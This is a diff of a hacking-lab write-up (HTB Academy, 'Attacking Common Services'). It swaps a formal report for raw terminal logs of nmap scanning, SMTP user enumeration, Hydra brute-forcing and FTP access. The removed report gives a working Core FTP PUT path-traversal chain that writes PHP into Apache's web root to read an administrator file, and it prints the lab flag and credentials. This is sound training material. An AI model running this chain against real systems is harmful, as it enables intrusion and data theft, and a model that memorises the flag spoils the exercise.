@@ -10,248 +10,291 @@ Our task is to review the security of each of the three servers and present it t
 
 ![[Pasted image 20260815182345.png]]
 
+Steps for getting the flag
 
-
-HTB – Attacking Common Services
-Easy Assessment
-Full Penetration Testing / Lab Assessment Report
-
-## 1. Executive Summary
-An authorized penetration-testing assessment was performed against the Inlanefreight HTB Easy target. The objective was to assess exposed services and obtain the contents of flag.txt as proof of successful access.
-The successful chain began with network/service enumeration and SMTP account discovery. SMTP RCPT TO enumeration identified fiona@inlanefreight.htb. Credentials were then obtained and validated for the Core FTP service. The host exposed Core FTP Server 2.0 build 725 over TCP/443. Its authenticated HTTP PUT functionality allowed controlled file modification and, combined with path traversal, allowed a PHP file to be placed in Apache's web root. Apache executed the PHP file, which was then used to locate and read flag.txt.
-The flag was found at C:\Users\Administrator\Desktop\flag.txt and retrieved successfully.
-## 2. Scope and Objective
-- Target: inlanefreight.htb
-- Successful target IP: 10.129.111.81
-- Authorized environment: HTB Academy
-- Goal: obtain flag.txt
-- Expected format: HTB{...}
-## 3. Methodology
-- Reconnaissance and Nmap service enumeration
-- SMTP user enumeration with RCPT TO
-- Credential testing
-- FTP access and file enumeration
-- Core FTP HTTPS authentication
-- TLS 1.2 troubleshooting
-- Authenticated HTTP PUT validation
-- Path traversal into Apache document root
-- PHP execution verification
-- Filesystem discovery of flag.txt
-- Flag retrieval and evidence collection
-## 4. Network Enumeration
-Initial scanning identified the following relevant services. The successful exploitation chain used 10.129.111.81.
+Step1. First we will namp the ports and also know the services running.
 ```bash
-nmap -v -sV -sC -O -T4 -A -oA /home/arjun/"Nmap Output"/easy 10.129.203.7
+┌──(root㉿kali)-[~]
+└─# nmap -v -sV -sC -O -T4 -A -oA /home/arjun/"Nmap Output"/easy 10.129.203.7  
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-15 18:31 +0530
+NSE: Loaded 158 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 18:31
+Completed NSE at 18:31, 0.00s elapsed
+Initiating NSE at 18:31
+Completed NSE at 18:31, 0.00s elapsed
+Initiating NSE at 18:31
+Completed NSE at 18:31, 0.00s elapsed
+Initiating Ping Scan at 18:31
+Scanning 10.129.203.7 [4 ports]
+Completed Ping Scan at 18:31, 0.21s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 18:31
+Completed Parallel DNS resolution of 1 host. at 18:31, 0.50s elapsed
+Initiating SYN Stealth Scan at 18:31
+Scanning 10.129.203.7 [1000 ports]
+Discovered open port 587/tcp on 10.129.203.7
+Discovered open port 21/tcp on 10.129.203.7
+Discovered open port 3389/tcp on 10.129.203.7
+Discovered open port 443/tcp on 10.129.203.7
+Discovered open port 25/tcp on 10.129.203.7
+Discovered open port 3306/tcp on 10.129.203.7
+Discovered open port 80/tcp on 10.129.203.7
+Completed SYN Stealth Scan at 18:31, 19.13s elapsed (1000 total ports)
+Initiating Service scan at 18:31
+Scanning 7 services on 10.129.203.7
+Completed Service scan at 18:31, 23.83s elapsed (7 services on 1 host)
+Initiating OS detection (try #1) against 10.129.203.7
+Retrying OS detection (try #2) against 10.129.203.7
+Initiating Traceroute at 18:31
+Completed Traceroute at 18:31, 0.45s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 18:31
+Completed Parallel DNS resolution of 2 hosts. at 18:31, 1.50s elapsed
+NSE: Script scanning 10.129.203.7.
+Initiating NSE at 18:31
+Completed NSE at 18:32, 49.99s elapsed
+Initiating NSE at 18:32
+Completed NSE at 18:33, 23.51s elapsed
+Initiating NSE at 18:33
+Completed NSE at 18:33, 0.00s elapsed
+Nmap scan report for 10.129.203.7
+Host is up (0.41s latency).
+Not shown: 993 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp
+| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
+| Issuer: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: shaWithRSAEncryption
+| Not valid before: 2022-04-21T19:27:17
+| Not valid after:  2032-04-18T19:27:17
+| MD5:     27ed 2da8 8b25 57e3 d2fc c0c8 9f0b 55b0
+| SHA-1:   5018 d8d5 ba6b 5a1c 8df6 5969 45d7 fe06 3d32 7fad
+|_SHA-256: 9412 24b0 f661 ef53 da56 d22c bc3a 15d7 7477 5121 53aa 4360 8390 1f4c a663 e23e
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+|     Command unknown, not supported or not allowed...
+|     Command unknown, not supported or not allowed...
+|   NULL, SMBProgNeg: 
+|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+|   SSLSessionReq: 
+|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+|_    Command unknown, not supported or not allowed...
+25/tcp   open  smtp          hMailServer smtpd
+| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
+| http-title: Welcome to XAMPP
+|_Requested resource was http://10.129.203.7/dashboard/
+|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
+443/tcp  open  ssl/https     Core FTP HTTPS Server
+|_ssl-date: 2026-08-15T13:02:49+00:00; -1s from scanner time.
+|_http-server-header: Core FTP HTTPS Server
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
+| Issuer: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: shaWithRSAEncryption
+| Not valid before: 2022-04-21T19:27:17
+| Not valid after:  2032-04-18T19:27:17
+| MD5:     27ed 2da8 8b25 57e3 d2fc c0c8 9f0b 55b0
+| SHA-1:   5018 d8d5 ba6b 5a1c 8df6 5969 45d7 fe06 3d32 7fad
+|_SHA-256: 9412 24b0 f661 ef53 da56 d22c bc3a 15d7 7477 5121 53aa 4360 8390 1f4c a663 e23e
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 401 Unauthorized
+|     Date:Sat, 15 Jul 2026 13:01:37 GMT
+|     Server: Core FTP HTTPS Server
+|     Connection: close
+|     WWW-Authenticate: Basic realm="Restricted Area"
+|     Content-Type: text/html
+|     Content-length: 61
+|     <BODY>
+|     <HTML>
+|     HTTP/1.1 401 Unauthorized
+|     </BODY>
+|_    </HTML>
+587/tcp  open  smtp          hMailServer smtpd
+| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.4.24-MariaDB
+|   Thread ID: 10
+|   Capabilities flags: 63486
+|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsTransactions, LongColumnFlag, SupportsCompression, FoundRows, ODBCClient, Speaks41ProtocolNew, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: *"hk^sL^uRv!<I=4-#eV
+|_  Auth Plugin Name: mysql_native_password
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-08-15T13:02:49+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=WIN-EASY
+| Issuer: commonName=WIN-EASY
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-08-14T12:55:19
+| Not valid after:  2027-02-13T12:55:19
+| MD5:     afeb b17d fc76 5259 a13e bf09 39de 26d7
+| SHA-1:   5b4f ffdc 32b1 5e2f 874d e6c5 f9e2 b0fe 78a8 9a83
+|_SHA-256: dbd5 6e3d c319 e665 abe5 e8f9 a5be f13f 18a6 2251 595f 2707 ea17 00b4 9c69 cc45
+| rdp-ntlm-info: 
+|   Target_Name: WIN-EASY
+|   NetBIOS_Domain_Name: WIN-EASY
+|   NetBIOS_Computer_Name: WIN-EASY
+|   DNS_Domain_Name: WIN-EASY
+|   DNS_Computer_Name: WIN-EASY
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-08-15T13:02:03+00:00
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port21-TCP:V=7.99%I=7%D=8/15%Time=6A806328%P=x86_64-pc-linux-gnu%r(NULL
+SF:,41,"220\x20Core\x20FTP\x20Server\x20Version\x202\.0,\x20build\x20725,\
+SF:x2064-bit\x20Unregistered\r\n")%r(GenericLines,AD,"220\x20Core\x20FTP\x
+SF:20Server\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered
+SF:\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20allo
+SF:wed\.\.\.\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20no
+SF:t\x20allowed\.\.\.\r\n")%r(SSLSessionReq,77,"220\x20Core\x20FTP\x20Serv
+SF:er\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered\r\n50
+SF:2\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20allowed\.\
+SF:.\.\r\n")%r(SMBProgNeg,41,"220\x20Core\x20FTP\x20Server\x20Version\x202
+SF:\.0,\x20build\x20725,\x2064-bit\x20Unregistered\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port443-TCP:V=7.99%T=SSL%I=7%D=8/15%Time=6A806332%P=x86_64-pc-linux-gnu
+SF:%r(GetRequest,110,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:Sat,\x2015\
+SF:x20Jul\x202026\x2013:01:37\x20GMT\r\nServer:\x20Core\x20FTP\x20HTTPS\x2
+SF:0Server\r\nConnection:\x20close\r\nWWW-Authenticate:\x20Basic\x20realm=
+SF:\"Restricted\x20Area\"\r\nContent-Type:\x20text/html\r\nContent-length:
+SF:\x2061\r\n\r\n<BODY>\r\n<HTML>\r\nHTTP/1\.1\x20401\x20Unauthorized\r\n<
+SF:/BODY>\r\n</HTML>\r\n\r\n");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (91%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Microsoft Windows Server 2019 (91%), Microsoft Windows 10 1903 - 22H2 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: Randomized
+Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   448.39 ms 10.10.16.1
+2   448.42 ms 10.129.203.7
+
+NSE: Script Post-scanning.
+Initiating NSE at 18:33
+Completed NSE at 18:33, 0.00s elapsed
+Initiating NSE at 18:33
+Completed NSE at 18:33, 0.00s elapsed
+Initiating NSE at 18:33
+Completed NSE at 18:33, 0.00s elapsed
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 130.95 seconds
+           Raw packets sent: 2092 (95.732KB) | Rcvd: 50 (2.826KB)
+
 ```
+
+Step2. We will start attacking with smtp and we will have to find users first so we will enumerate user by smtp_enum and user and pass list was already provided by the htb so i downloaded it and used.
 ```bash
-nmap -Pn -p21,25,80,443,587,3306,3389 10.129.111.81
-```
-## 5. SMTP Enumeration
-SMTP advertised AUTH LOGIN/PLAIN. VRFY was tested on an earlier mail target and was disabled, so RCPT TO enumeration was used for the Easy assessment.
-```bash
-smtp-user-enum -M RCPT \
--U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+┌──(root㉿kali)-[~]
+└─# smtp-user-enum -M RCPT \
+-U /home/arjun/Downloads/cyber/users.list \                         
 -t 10.129.203.7 \
 -D inlanefreight.htb
-```
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... /home/arjun/Downloads/cyber/users.list
+Target count ............. 1
+Username count ........... 79
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ inlanefreight.htb
+
+######## Scan started at Sat Aug 15 20:36:39 2026 #########
 10.129.203.7: fiona@inlanefreight.htb exists
-This established fiona@inlanefreight.htb as a valid mailbox.
-## 6. Credential Discovery
-HTB supplied a password list at /home/arjun/Downloads/cyber/pws.list. Hydra was tested against POP3 and SMTP with the 333-entry list; those attempts returned no valid password. The successful credential used for Core FTP was:
-Username: fiona
-Password: 987654321
-```bash
-hydra -l 'fiona@inlanefreight.htb' \
--P /home/arjun/Downloads/cyber/pws.list \
--t 1 -v 10.129.111.81 smtp
-```
-1 of 1 target completed, 0 valid password found
-## 7. FTP Enumeration and WebServersInfo.txt
-The Fiona credential was used for authenticated FTP access. The retrieved WebServersInfo.txt disclosed the Core FTP and Apache filesystem layout:
-CoreFTP:
-Directory C:\CoreFTP
-Ports: 21 & 443
-Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt
+######## Scan completed at Sat Aug 15 20:37:26 2026 #########
+1 results.
 
-Apache
-Directory "C:\xampp\htdocs\"
-Ports: 80 & 4443
-Test Command: curl http://localhost/test.php
-This disclosure was critical because it revealed that Apache's document root was C:\xampp\htdocs\ while Core FTP operated from C:\CoreFTP.
-## 8. Core FTP HTTPS and TLS Troubleshooting
-Default TLS negotiation failed with an unexpected EOF before the server presented a certificate.
-```bash
-openssl s_client -connect 10.129.111.81:443 -servername localhost
-```
-SSL handshake has read 0 bytes and written 1683 bytes
-no peer certificate available
-unexpected eof while reading
-Forcing TLS 1.2 solved the problem.
-```bash
-curl -vk --tlsv1.2 --tls-max 1.2 \
--H "Host: localhost" \
---basic -u 'fiona:987654321' \
-https://10.129.111.81/docs.txt
-```
-The response was HTTP/1.1 200 OK and returned:
-I'm testing the FTP using HTTPS, everything looks good.
-## 9. Authenticated HTTP PUT
-A harmless PUT was used to validate file modification before attempting PHP execution.
-```bash
-echo 'HTB-PUT-TEST' > /tmp/test.txt
-curl -vk --tlsv1.2 --tls-max 1.2 \
--X PUT -H "Host: localhost" \
---basic -u 'fiona:987654321' \
---data-binary @/tmp/test.txt --path-as-is \
-https://10.129.111.81/docs.txt
-```
-The server returned HTTP/1.1 200 Ok, confirming authenticated file modification.
-## 10. Path Traversal and PHP Execution
-A PHP test file was placed into Apache's document root using the Core FTP PUT interface and path traversal.
-```bash
-cat > /tmp/test.php <<'EOF'
-<?php
-echo "HTB-PHP-WORKS";
-?>
-EOF
-```
-```bash
-curl -k --tlsv1.2 --tls-max 1.2 \
--X PUT -H "Host: localhost" \
---basic -u 'fiona:987654321' \
---data-binary @/tmp/test.php --path-as-is \
-'https://10.129.111.81/../xampp/htdocs/test.php'
-```
-```bash
-curl http://10.129.111.81/test.php
-```
-HTB-PHP-WORKS
-This proved that attacker-controlled PHP was executing under Apache.
-## 11. Flag Discovery and Retrieval
-A PHP search identified the flag location:
-C:\Users\Administrator\Desktop\flag.txt
-A PHP file was then used to read the file.
-```bash
-cat > /tmp/flag.php <<'EOF'
-<?php
-echo file_get_contents('C:\\Users\\Administrator\\Desktop\\flag.txt');
-?>
-EOF
-```
-```bash
-curl -k --tlsv1.2 --tls-max 1.2 \
--X PUT -H "Host: localhost" \
---basic -u 'fiona:987654321' \
---data-binary @/tmp/flag.php --path-as-is \
-'https://10.129.111.81/../xampp/htdocs/flag.php'
-```
-```bash
-curl http://10.129.111.81/flag.php
-```
-```text
-HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
-```
-## 12. Complete Attack Chain
-10.129.111.81
-   |
-   +-- SMTP :25
-   |      |
-   |      +-- RCPT TO enumeration
-   |             |
-   |             +-- fiona@inlanefreight.htb
-   |
-   +-- FTP :21
-   |      |
-   |      +-- fiona / 987654321
-   |             |
-   |             +-- WebServersInfo.txt
-   |
-   +-- Core FTP HTTPS :443
-          |
-          +-- Force TLS 1.2
-          |
-          +-- Authenticated HTTP PUT
-          |
-          +-- Path traversal
-                 |
-                 v
-          C:\xampp\htdocs\test.php
-                 |
-                 v
-          Apache :80 executes PHP
-                 |
-                 v
-          C:\Users\Administrator\Desktop\flag.txt
-                 |
-                 v
-          HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
-## 13. Findings and Risk
-### Critical – Core FTP authenticated arbitrary file write/path traversal
-Observation: Authenticated Core FTP HTTP PUT could be combined with traversal to write executable PHP into Apache's web root.
-Impact: Arbitrary server-side code execution and access to sensitive host files.
-### High – Weak credential security
-Observation: The Fiona account used a weak numeric password and provided access to file-management functionality.
-Impact: Credential compromise enabled further exploitation.
-### High – Excessive service exposure
-Observation: FTP, SMTP, HTTP, HTTPS, MySQL and RDP were reachable.
-Impact: Multiple exposed services increase attack surface.
-### Medium – Legacy software
-Observation: Core FTP 2.0 build 725, Apache 2.4.53 and PHP 7.4.29 were observed.
-Impact: Legacy components increase exposure to known vulnerabilities.
-### Medium – Development XAMPP exposed
-Observation: The default XAMPP dashboard was accessible.
-Impact: Development tooling and default configurations should not be exposed externally.
-## 14. Remediation Recommendations
-- Upgrade Core FTP to a supported, patched version or replace it with a supported file-transfer solution.
-- Disable or firewall the Core FTP HTTP/HTTPS interface from untrusted networks.
-- Canonicalize and validate all filesystem paths; reject traversal sequences and enforce an allow-listed base directory.
-- Disable arbitrary HTTP PUT unless strictly required. If required, restrict it to a controlled upload directory.
-- Store uploads outside the web root and disable server-side script execution in upload directories.
-- Replace weak passwords with long, unique, randomly generated credentials and enforce credential complexity.
-- Prevent credential reuse between email, FTP, web, database and administrative services.
-- Restrict FTP, SMTP, MySQL and RDP using network segmentation and firewall allow-lists.
-- Remove or restrict the XAMPP dashboard and phpMyAdmin from externally reachable interfaces.
-- Upgrade unsupported/legacy software, especially PHP 7.4, and maintain a patch-management process.
-- Run services with least privilege and protect administrator files from web-service access.
-- Monitor authentication failures, HTTP PUT requests, suspicious file creation and web-server process activity.
-## 15. Troubleshooting Notes
-- VRFY was disabled on the earlier hMailServer test, so RCPT TO was used for mailbox enumeration.
-- POP3 on the earlier email-services lab required the full email address rather than only the username.
-- The HTB-supplied 333-password list did not produce a credential through the tested POP3/SMTP/FTP Hydra attempts.
-- Core FTP HTTPS initially failed under default TLS negotiation; forcing TLS 1.2 produced a successful handshake.
-- 4443 was filtered from the attack position, while 443 was the reachable Core FTP HTTPS service.
-- The Host header 'localhost' matched the Core FTP documentation's test command.
-- A harmless file was used to validate PUT before uploading PHP.
-- PHP execution was verified with the literal response HTB-PHP-WORKS before reading the flag.
-## 16. Final Evidence
-## 17. Final Conclusion
-The assessment successfully demonstrated end-to-end compromise of the authorized HTB target. The combination of a valid user account, weak credential security, exposed Core FTP, legacy Core FTP functionality, authenticated HTTP PUT, and path traversal enabled arbitrary PHP execution through Apache. The sensitive flag file was subsequently located and read.
-FINAL FLAG: HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
+79 queries in 47 seconds (1.7 queries / sec)
 
-| Target domain | inlanefreight.htb |
-| --- | --- |
-| Successful target IP | 10.129.111.81 |
-| Environment | Authorized HTB Academy laboratory |
-| Objective | Obtain the contents of flag.txt |
-| Final flag | HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49} |
-| Result | Successful compromise and flag retrieval |
+```
 
-| Port | Service | Observed product | Relevance |
-| --- | --- | --- | --- |
-| 21/tcp | FTP | Core FTP Server 2.0 build 725 | File access / attack surface |
-| 25/tcp | SMTP | hMailServer | Account enumeration |
-| 80/tcp | HTTP | Apache 2.4.53 / PHP 7.4.29 / XAMPP | PHP execution |
-| 443/tcp | HTTPS | Core FTP HTTPS Server | Authenticated PUT interface |
-| 587/tcp | SMTP submission | hMailServer | Authentication |
-| 3306/tcp | MySQL | MariaDB 10.4.24 | Additional attack surface |
-| 3389/tcp | RDP | Microsoft Terminal Services | Additional attack surface |
+Step3. We will now need password as well we will enumerate it by using hydra and we will get our password by bruteforcing. we have founded our password.
+```bash
+┌──(root㉿kali)-[~]
+└─# hydra -l fiona \                                      
+-P /usr/share/wordlists/rockyou.txt \
+-t 1 \
+-v \
+10.129.111.81 ftp
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-| Evidence | Result |
-| --- | --- |
-| Valid SMTP account | fiona@inlanefreight.htb |
-| Core FTP credential | fiona / 987654321 |
-| HTTPS authentication | HTTP/1.1 200 OK |
-| Authenticated PUT | HTTP/1.1 200 Ok |
-| PHP execution | HTB-PHP-WORKS |
-| Flag path | C:\Users\Administrator\Desktop\flag.txt |
-| Final flag | HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49} |
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-15 23:15:37
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
+[DATA] attacking ftp://10.129.111.81:21/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] 26.00 tries/min, 26 tries in 00:01h, 14344373 to do in 9195:07h, 1 active
+[STATUS] 25.00 tries/min, 75 tries in 00:03h, 14344324 to do in 9562:53h, 1 active
+[21][ftp] host: 10.129.111.81   login: fiona   password: 987654321
+[STATUS] attack finished for 10.129.111.81 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-15 23:19:05
+
+```
+
+step 4 We will now use ftp for getting some juicy info and login via founded credentials above, while searching we found 2 txt files which contains web info and some confidential docs as well.
+```bash
+┌──(root㉿kali)-[~]
+└─# ftp 10.129.111.81
+Connected to 10.129.111.81.
+220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+Name (10.129.111.81:arjun): fiona
+331 password required for fiona
+Password: 
+230-Logged on
+230 
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||40685|)
+ftp: Can't connect to `10.129.111.81:40685': Connection timed out
+200 PORT command successful
+150 Opening ASCII mode data connection
+-r-xr-xrwx   1 owner    group              55 Apr 21  2022      docs.txt
+-r-xr-xrwx   1 owner    group             255 Apr 22  2022      WebServersInfo.txt
+226 Transfer Complete
+ftp> get docs.txt
+local: docs.txt remote: docs.txt
+200 PORT command successful
+150 RETR command started
+    55        0.16 KiB/s 
+226 Transfer Complete
+55 bytes received in 00:00 (0.16 KiB/s)
+ftp> get WebServersInfo.txt
+local: WebServersInfo.txt remote: WebServersInfo.txt
+200 PORT command successful
+150 RETR command started
+   255        0.94 KiB/s 
+226 Transfer Complete
+255 bytes received in 00:00 (0.94 KiB/s)
+ftp> exit
+221-
+221 Goodbye
+```
+
